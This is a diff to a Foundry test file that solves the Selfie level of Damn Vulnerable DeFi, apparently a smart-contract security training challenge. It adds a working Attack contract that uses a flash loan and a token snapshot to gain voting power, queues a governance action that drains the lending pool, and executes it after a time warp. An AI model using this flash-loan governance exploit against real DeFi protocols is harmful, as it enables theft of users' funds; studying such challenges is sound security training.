@@ -7,6 +7,37 @@ import "forge-std/Test.sol";
 import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
+import {ERC20Snapshot} from "openzeppelin-contracts/token/ERC20/extensions/ERC20Snapshot.sol";
+
+contract Attack {
+    SimpleGovernance public simplegovernance;
+    SelfiePool public selfiepool;
+    DamnValuableTokenSnapshot public dvtsnapshot;
+    uint256 actionId = 0;
+
+    constructor(address sp, address sg, address dvtsnap) {
+        selfiepool = SelfiePool(sp);
+        simplegovernance = SimpleGovernance(sg);
+        dvtsnapshot = DamnValuableTokenSnapshot(dvtsnap);
+    }
+
+    function attack() public {
+        selfiepool.flashLoan(dvtsnapshot.balanceOf(address(selfiepool)));
+    }
+
+    function receiveTokens(address tokenAddress, uint256 borrowAmount) public {
+        dvtsnapshot.snapshot();
+        actionId = simplegovernance.queueAction(
+            address(selfiepool), abi.encodeWithSignature("drainAllFunds(address)", address(this)), 0
+        );
+        dvtsnapshot.transfer(address(selfiepool), borrowAmount);
+    }
+
+    function execute() public {
+        simplegovernance.executeAction(actionId);
+        dvtsnapshot.transfer(address(msg.sender), dvtsnapshot.balanceOf(address(this)));
+    }
+}
 
 contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
@@ -47,7 +78,12 @@ contract Selfie is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        Attack attack = new Attack(address(selfiePool), address(simpleGovernance), address(dvtSnapshot));
+        attack.attack();
+        vm.warp(3 days);
+        attack.execute();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
